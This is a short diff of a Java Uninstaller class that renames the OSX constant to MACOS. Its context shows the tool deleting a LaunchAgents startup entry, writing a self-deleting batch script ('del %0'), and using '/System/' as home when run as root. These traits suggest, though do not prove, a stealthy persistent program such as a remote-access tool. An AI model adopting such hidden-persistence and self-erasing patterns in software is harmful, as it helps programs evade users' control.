@@ -24,7 +24,7 @@ public class Uninstaller extends Thread {
 			
 			String home = System.getProperty("user.home");
 			
-			if (Utils.isRoot() && OperatingSystem.getOperatingSystem().getType() == OperatingSystem.OSX) {
+			if (Utils.isRoot() && OperatingSystem.getOperatingSystem().getType() == OperatingSystem.MACOS) {
 				home = "/System/";
 			}
 
@@ -38,7 +38,7 @@ public class Uninstaller extends Thread {
 				text += "del %0";
 				text = text.replace("\n", " & ");
 
-			} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.OSX) {
+			} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.MACOS) {
 				File startupFile = new File(home + "/Library/LaunchAgents/" + Configuration.getName() + ".plist");
 				startupFile.delete();
 
@@ -67,7 +67,7 @@ public class Uninstaller extends Thread {
 
 				if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
 					Runtime.getRuntime().exec(new String[] { "cmd", "/c", file.getAbsolutePath() });
-				} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.OSX || OperatingSystem.getOperatingSystem().getType() == OperatingSystem.LINUX) {
+				} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.MACOS || OperatingSystem.getOperatingSystem().getType() == OperatingSystem.LINUX) {
 					Runtime.getRuntime().exec(new String[] { Shell.getShell().getPath(), file.getName() });
 				}
 			}
